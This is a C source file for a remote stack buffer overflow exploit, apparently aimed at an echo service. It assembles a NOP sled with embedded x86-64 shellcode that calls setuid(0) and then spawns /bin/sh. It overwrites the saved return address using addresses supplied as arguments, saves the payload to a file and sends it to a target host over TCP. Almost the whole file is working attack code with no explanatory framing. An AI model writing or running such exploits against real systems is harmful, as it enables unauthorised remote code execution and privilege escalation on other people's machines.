#define _POSIX_SOURCE

#include <stddef.h>
#include <errno.h>
#include <string.h>

typedef enum status_type {
	STATUS_SUCCESS,
	STATUS_FAILURE
} status_type;

typedef struct status_t {
	status_type type;
	const char* reason;
} status_t;

status_t success (void)
{
	return (status_t) {
		.type   = STATUS_SUCCESS,
		.reason = NULL
	};
}

status_t failure (const char* reason)
{
	return (status_t) {
		.type   = STATUS_FAILURE,
		.reason = reason
	};
}

status_t efailure (int err)
{
	return failure (strerror (err));
}

int failed (status_t s)
{
	return s.type == STATUS_FAILURE;
}


#include <stdlib.h>
#include <netdb.h>
#include <arpa/inet.h>

status_t connect_tcp (int (*the_socket),
                      const char* address,
                      const char* port)
{
	// Use TCP
	struct protoent* proto_tcp = getprotobyname ("tcp");
	if (proto_tcp == NULL)
		return failure ("TCP not supported");

	// Prepare a TCP/IPv4 socket
	int _the_socket = socket (PF_INET, SOCK_STREAM, proto_tcp->p_proto);
	if (_the_socket == -1)
		return efailure (errno);

	// Prepare IPv4 address given by address:port
	struct sockaddr_in svaddr = (struct sockaddr_in) {.sin_family = AF_INET};

	switch (inet_pton (AF_INET, address, &svaddr.sin_addr)) {
		case 1:  break;
		case 0:  return failure ("Invalid network address");
		default: return efailure (errno);
	}

	const char* endptr = port;
	long int port_l = strtoul (port, (char**)&endptr, 10);
	if ((*port == '\0' || *endptr != '\0') ||
	    (port_l < 0    || port_l > 65535))
		return failure ("Invalid port number");
	svaddr.sin_port = htons (port_l);

	// Connect TCP socket to address:port
	if (connect (_the_socket, (struct sockaddr*)&svaddr, sizeof (svaddr)) != 0)
		return efailure (errno);

	(*the_socket) = _the_socket;
	return success ();
}


#include <stdint.h>
#include <limits.h>

status_t prepare_exploit (char* (*data),
                          uint64_t buf_addr,
                          uint64_t rip_addr)
{
	static const char shellcode [] =
		"\xeb\x0e\x5f\x48\x31\xc0\x48\x89"
		"\xc6\x48\x89\xc2\xb0\x3b\x0f\x05"
		"\x48\x31\xc0\x48\x89\xc7\xb0\x69"
		"\x0f\x05\xe8\xe3\xff\xff\xff\x2f"
		"\x62\x69\x6e\x2f\x73\x68";

	size_t rip_offset = rip_addr - buf_addr;
	size_t data_size  = rip_offset          // Distance to RIP
                      + sizeof (uint64_t)   // Size of RIP
                      + 128                 // 128 bytes of padding
                      + strlen (shellcode); // Payload

	// Get storage for payload
	char* _data = (char*) malloc (data_size + 1);
	if (_data == NULL)
		return failure ("Could not allocate memory for payload");

	// Prepare a proper C-string filled with IA32 NOPs
	memset (_data, 0x90, data_size);
	_data [data_size] = '\0';

	// Set the RIP to the highest address before the shell code
	uint64_t new_rip = buf_addr + data_size - strlen (shellcode);
	memcpy (_data + rip_offset, &new_rip, sizeof (uint64_t));

	// Copy in the shell code
	memcpy (_data + data_size - strlen (shellcode), shellcode, strlen (shellcode));

	(*data) = _data;
	return success ();
}


#include <stdio.h>
#include <unistd.h>

status_t stream_exploit (const char* data, FILE* stream)
{
	if (fputs (data, stream) <= 0)
		return efailure (errno);
	return success ();
}

status_t dump_exploit (const char* data, const char* filename)
{
	FILE* file = fopen (filename, "w");
	if (file == NULL)
		return efailure (errno);

	status_t status = stream_exploit (data, file);
	if (failed (status))
		return status;

	if (fclose (file) != 0)
		return efailure (errno);

	return success ();
}

status_t send_exploit (const char* data, int fd)
{
	int fd2 = dup (fd);
	if (fd2 == -1)
		return efailure (errno);

	FILE* stream = fdopen (fd2, "w");
	if (stream == NULL)
		return efailure (errno);

	status_t status = stream_exploit (data, stream);
	if (failed (status))
		return status;

	if (fclose (stream) != 0)
		return efailure (errno);

	return success ();
}



status_t parse_address (uint64_t (*addr),
                        const char* addr_s)
{
	const char* endptr = addr_s;
	uint64_t _addr = strtoull (addr_s, (char**)&endptr, 10);
	if ((*addr_s == '\0' || *endptr != '\0'))
		return failure ("Invalid address");

	(*addr) = _addr;
	return success ();
}

int main (int argc, char** argv)
{
	status_t status = success ();

	if (argc != 5) {
		fprintf (stderr, "Usage: %s address port buf_addr rip_addr\n", argc == 0 ? "attack" : argv [0]);
		return EXIT_FAILURE;
	}

	uint64_t buf_addr = 0;
	status = parse_address (&buf_addr, argv [3]);
	if (failed (status)) {
		fprintf (stderr, "%s: %s\n", status.reason, argv [3]);
		return EXIT_FAILURE;
	}

	uint64_t rip_addr = 0;
	status = parse_address (&rip_addr, argv [4]);
	if (failed (status)) {
		fprintf (stderr, "%s: %s\n", status.reason, argv [4]);
		return EXIT_FAILURE;
	}

	char* exploit = NULL;
	status = prepare_exploit (&exploit, buf_addr, rip_addr);
	if (failed (status)) {
		fprintf (stderr, "Could not prepare exploit (%s)\n", status.reason);
		return EXIT_FAILURE;
	}

	const char* filename = "bad.dat";
	status = dump_exploit (exploit, filename);
	if (failed (status)) {
		fprintf (stderr, "Could not dump exploit to %s (%s)\n", filename, status.reason);
		return EXIT_FAILURE;
	}

	int echo_socket = -1;
	status = connect_tcp (&echo_socket, argv [1], argv [2]);
	if (failed (status)) {
		fprintf (stderr, "Could not connect to %s:%s (%s)\n", argv [1], argv [2], status.reason);
		return EXIT_FAILURE;
	}

	status = send_exploit (exploit, echo_socket);
	if (failed (status)) {
		fprintf (stderr, "Could not send exploit to %s:%s (%s)\n", argv [1], argv [2], status.reason);
		return EXIT_FAILURE;
	}

	free (exploit);
	close (echo_socket);

	return EXIT_SUCCESS;
}
